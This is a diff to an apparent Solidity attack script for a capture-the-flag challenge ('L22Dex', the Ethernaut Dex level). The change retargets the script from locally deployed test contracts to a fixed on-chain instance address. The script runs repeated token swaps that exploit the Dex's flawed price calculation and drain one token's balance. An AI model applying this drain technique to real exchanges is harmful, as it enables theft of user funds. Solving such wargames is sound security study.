@@ -34,15 +34,13 @@ import {Dex, SwappableToken} from "src/L22Dex.sol";
  *   Dex Token 1 balance 0 Dex Token 2 balance 90
  */
 contract L22DexAttack is Script, Broadcast {
-    Dex dex = new Dex();
-    SwappableToken token1 = new SwappableToken(address(dex), "Token 1", "T1", 200);
-    SwappableToken token2 = new SwappableToken(address(dex), "Token 2", "T2", 200);
+    address constant instanceAddress = 0xe8A9EC3C730f0911e52462b915A516254272Aa16;
+
+    Dex dex = Dex(instanceAddress);
 
     address myAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
 
     function run() public {
-        dex.setTokens(address(token1), address(token2));
-        vm.startPrank(myAddress);
         // Approve the dex contract to spend your tokens
         dex.approve(address(dex), type(uint256).max);
 
@@ -61,7 +59,6 @@ contract L22DexAttack is Script, Broadcast {
         // Final swap
         dex.swap(dex.token2(), dex.token1(), dex.balanceOf(dex.token2(), address(dex)));
         _logBalances();
-        vm.stopPrank();
     }
 
     function _logBalances() internal view {
